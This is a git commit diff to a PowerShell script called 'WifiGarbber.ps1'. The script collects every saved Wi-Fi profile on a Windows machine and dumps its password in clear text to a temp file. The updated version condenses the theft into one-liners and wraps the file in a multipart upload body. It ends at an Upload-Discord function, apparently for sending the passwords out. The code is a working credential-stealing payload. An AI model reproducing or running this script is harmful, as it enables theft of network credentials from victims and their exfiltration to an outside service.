404373a8a36290d581cf1829f560cb22f4c77629
katzenkreiter <johannes1353@gmail.com>
2025-05-12 15:10:39 +0200

    Update WifiGarbber.ps1

--- WifiGarbber.ps1
+++ WifiGarbber.ps1
@@ -1,55 +1,13 @@
-# Skript zum Abrufen der WLAN-Profile und deren Passwörter (sofern vorhanden)
+$filePath="$env:TEMP\wlan_list.txt"
 
-# Definiere die Pfad zur temporären Datei, in der die Passwörter gespeichert werden
-$filePath = "$env:TEMP\--wifi-pass.txt"
-$wifiProfiles = @()
+netsh wlan show profiles|Out-File -FilePath $filePath
 
-# Alle WLAN-Profile extrahieren
-$profileNames = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
-    $_.ToString().Trim() -replace "All User Profile\s*:\s*", ""
-}
+netsh wlan show profiles|Select-String " : "|ForEach-Object{($_ -split ":")[1].Trim()}|ForEach-Object{"`n--- WLAN: $_ ---";netsh wlan show profile name="$_" key=clear}|Out-File -FilePath $filePath -Append
 
-# Überprüfen, ob WLAN-Profile gefunden wurden
-if ($profileNames.Count -eq 0) {
-    Write-Host "Keine WLAN-Profile gefunden. Stelle sicher, dass du Administratorrechte hast und WLAN-Profile auf deinem PC gespeichert sind."
-} else {
-    Write-Host "Gefundene WLAN-Profile: $($profileNames.Count)"
-}
+$boundary=[System.Guid]::NewGuid().ToString();$LF="`r`n";$bodyLines=("--$boundary","Content-Disposition: form-data; name=`"file`"
 
-# Für jedes Profil das Passwort extrahieren
-foreach ($name in $profileNames) {
-    Write-Host "Verarbeite Profil: $name"
-    
-    $profileDetails = netsh wlan show profile name="$name" key=clear
-    $keyLine = $profileDetails | Select-String "Key Content"
+filename=`"$([System.IO.Path]::GetFileName($filePath))`"","Content-Type: text/plain","","$(Get-Content -Raw $filePath)","--$boundary--") -join $LF;$headers=@{"Content-Type"="multipart/form-data; boundary=$boundary"}
 
-    # Überprüfen, ob ein Passwort gefunden wurde
-    if ($keyLine) {
-        $password = ($keyLine -split ":", 2)[1].Trim()
-        Write-Host "Passwort für $name gefunden: $password"
-    } else {
-        $password = "<Kein Passwort gefunden>"
-        Write-Host "Kein Passwort für $name gefunden."
-    }
-
-    # Profilname und Passwort als Objekt speichern
-    $wifiProfiles += [PSCustomObject]@{
-        PROFILE_NAME = $name
-        PASSWORD     = $password
-    }
-}
-
-# Ausgabe der gefundenen WLAN-Profile und Passwörter als Tabelle
-if ($wifiProfiles.Count -gt 0) {
-    Write-Host "WLAN-Profile mit Passwörtern:"
-    $wifiProfiles | Format-Table -AutoSize
-
-    # Speichern der Daten in einer Datei
-    $wifiProfiles | Format-Table -AutoSize | Out-File $filePath
-    Write-Host "WLAN-Profile und Passwörter wurden in der Datei gespeichert: $filePath"
-} else {
-    Write-Host "Keine WLAN-Profile mit Passwörtern gefunden."
-}
 
 function Upload-Discord {
 
